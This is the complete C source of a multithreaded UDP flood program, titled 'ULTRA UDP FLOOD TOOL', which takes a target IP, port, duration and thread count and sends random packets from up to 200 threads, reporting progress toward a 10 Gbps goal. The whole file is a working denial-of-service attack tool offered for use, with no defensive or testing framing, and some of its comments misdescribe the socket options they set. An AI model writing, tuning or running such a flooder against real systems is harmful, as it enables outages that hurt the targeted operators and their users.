#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>

#define BUFFER_SIZE 1472  // Maximum UDP payload for 1500 MTU
#define MAX_THREADS 200   // Increased for more parallelism
#define STATS_INTERVAL 2

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    long packet_count;
    long total_bytes;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile long global_packets = 0;
volatile long global_bytes = 0;
time_t global_start_time;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down...\n");
}

// High-resolution time function
long long get_time_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (long long)tv.tv_sec * 1000 + tv.tv_usec / 1000;
}

void *stats_thread(void *arg) {
    time_t last_time = time(NULL);
    long last_packets = 0;
    long last_bytes = 0;
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        
        time_t current_time = time(NULL);
        long current_packets = global_packets;
        long current_bytes = global_bytes;
        long interval_packets = current_packets - last_packets;
        long interval_bytes = current_bytes - last_bytes;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            double mbps = (interval_bytes * 8.0) / (interval_seconds * 1000000);
            double gbps = mbps / 1000;
            
            printf("[STATS] PPS: %.0f | Gbps: %.2f | Total: %.2f GB | Time: %lds\n", 
                   pps, gbps, (double)current_bytes / (1024*1024*1024), (current_time - global_start_time));
            
            // Performance warning
            if (gbps < 8.0 && (current_time - global_start_time) > 10) {
                printf("[WARNING] Performance below target! Current: %.2f Gbps\n", gbps);
            }
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    return NULL;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    
    int sock;
    struct sockaddr_in target;
    char *buffer;
    socklen_t target_len = sizeof(target);

    // Create RAW socket for maximum performance
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    // ULTRA socket optimization
    int sock_opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(sock_opt));
    
    // MAXIMUM buffer sizes
    int sendbuf = 64 * 1024 * 1024;  // 64MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    
    // Disable Nagle algorithm and enable turbo mode
    int turbo = 1;
    setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &turbo, sizeof(turbo));
    
    // Non-blocking for absolute maximum speed
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        free(args);
        return NULL;
    }

    // Pre-allocate and initialize multiple buffers for batch sending
    #define NUM_BUFFERS 16
    char *buffers[NUM_BUFFERS];
    
    for (int i = 0; i < NUM_BUFFERS; i++) {
        buffers[i] = malloc(BUFFER_SIZE);
        if (!buffers[i]) {
            perror("Buffer allocation failed");
            for (int j = 0; j < i; j++) free(buffers[j]);
            close(sock);
            free(args);
            return NULL;
        }
        
        // Fill with high-entropy random data from urandom
        FILE *urandom = fopen("/dev/urandom", "rb");
        if (urandom) {
            fread(buffers[i], 1, BUFFER_SIZE, urandom);
            fclose(urandom);
        } else {
            // High-speed fallback - pattern based
            memset(buffers[i], (i + thread_id) % 256, BUFFER_SIZE);
        }
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    long thread_packets = 0;
    long thread_bytes = 0;
    int buffer_index = 0;
    int consecutive_errors = 0;
    
    printf("Thread %d started - Target: %s:%d\n", thread_id, ip, port);
    
    // ULTRA FAST FLOOD LOOP - OPTIMIZED FOR 10+ GBPS
    while (keep_running && time(NULL) < end_time) {
        // Send multiple packets in rapid succession
        for (int burst = 0; burst < 100; burst++) {
            for (int i = 0; i < 10; i++) {
                ssize_t sent = sendto(sock, buffers[buffer_index], BUFFER_SIZE, MSG_DONTWAIT, 
                                     (struct sockaddr *)&target, target_len);
                
                if (sent > 0) {
                    thread_packets++;
                    thread_bytes += sent;
                    consecutive_errors = 0;
                } else {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        // Buffer full - continue immediately to next packet
                        continue;
                    }
                    consecutive_errors++;
                    if (consecutive_errors > 10000) {
                        usleep(100); // Micro-sleep if persistent errors
                        consecutive_errors = 0;
                    }
                }
                
                buffer_index = (buffer_index + 1) % NUM_BUFFERS;
            }
        }
        
        // Batch update global stats to reduce lock contention
        if (thread_packets > 10000) {
            __sync_fetch_and_add(&global_packets, thread_packets);
            __sync_fetch_and_add(&global_bytes, thread_bytes);
            thread_packets = 0;
            thread_bytes = 0;
        }
    }

    // Final stats update
    if (thread_packets > 0) {
        __sync_fetch_and_add(&global_packets, thread_packets);
        __sync_fetch_and_add(&global_bytes, thread_bytes);
    }

    // Cleanup
    for (int i = 0; i < NUM_BUFFERS; i++) {
        free(buffers[i]);
    }
    close(sock);
    printf("Thread %d finished - Packets: %ld\n", thread_id, thread_packets);
    free(args);
    return NULL;
}

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════╗\n");
    printf("║           ULTRA UDP FLOOD TOOL              ║\n");
    printf("║              [10+ GBPS EDITION]             ║\n");
    printf("╚══════════════════════════════════════════════╝\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 200\n", argv[0]);
        printf("Recommended: 150-200 threads for 10 Gbps\n");
        exit(EXIT_FAILURE);
    }

    print_banner();
    
    // Setup signal handling
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    if (num_threads > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }

    if (num_threads < 50) {
        printf("Warning: For 10 Gbps, use at least 100 threads (current: %d)\n", num_threads);
    }

    printf("[INFO] Target: %s:%d\n", ip, port);
    printf("[INFO] Duration: %d seconds\n", duration);
    printf("[INFO] Threads: %d\n", num_threads);
    printf("[INFO] Buffer size: %d bytes\n", BUFFER_SIZE);
    printf("[INFO] Expected: 10+ Gbps constant\n");
    printf("[INFO] Starting attack in 3 seconds...\n");
    sleep(3);

    global_start_time = time(NULL);
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thr;

    // Start statistics thread
    if (pthread_create(&stats_thr, NULL, stats_thread, NULL) != 0) {
        perror("Could not create stats thread");
        exit(EXIT_FAILURE);
    }

    // Create flood threads with staggered startup
    int threads_created = 0;
    for (int i = 0; i < num_threads; i++) {
        flood_args_t *args = calloc(1, sizeof(flood_args_t));
        if (!args) {
            perror("Memory allocation failed");
            continue;
        }
        
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->duration = duration;
        args->thread_id = i + 1;

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)args) == 0) {
            threads_created++;
        } else {
            perror("Could not create thread");
            free(args);
        }
        
        // Stagger thread creation to avoid initial burst
        usleep(1000);
    }

    printf("[INFO] Created %d flood threads\n", threads_created);
    printf("[INFO] Attack running...\n");
    
    // Wait for all threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_thr, NULL);

    // Final statistics
    time_t total_time = time(NULL) - global_start_time;
    if (total_time == 0) total_time = 1;
    double avg_pps = (double)global_packets / total_time;
    double total_gb = (double)global_bytes / (1024 * 1024 * 1024);
    double avg_gbps = (total_gb * 8) / total_time;
    
    printf("\n╔══════════════════════════════════════════════╗\n");
    printf("║                 FINAL STATS                 ║\n");
    printf("╠══════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %-29ld ║\n", global_packets);
    printf("║ Total Data:    %-8.2f GB              ║\n", total_gb);
    printf("║ Duration:      %-8ld seconds          ║\n", total_time);
    printf("║ Average PPS:   %-8.0f packets/sec     ║\n", avg_pps);
    printf("║ Average Gbps:  %-8.2f Gbps            ║\n", avg_gbps);
    printf("╚══════════════════════════════════════════════╝\n");

    if (avg_gbps >= 8.0) {
        printf("\n🎯 TARGET ACHIEVED: 10+ Gbps Performance! 🎯\n");
    } else {
        printf("\n⚠️  Below target. Try increasing threads to 200+\n");
    }

    return 0;
}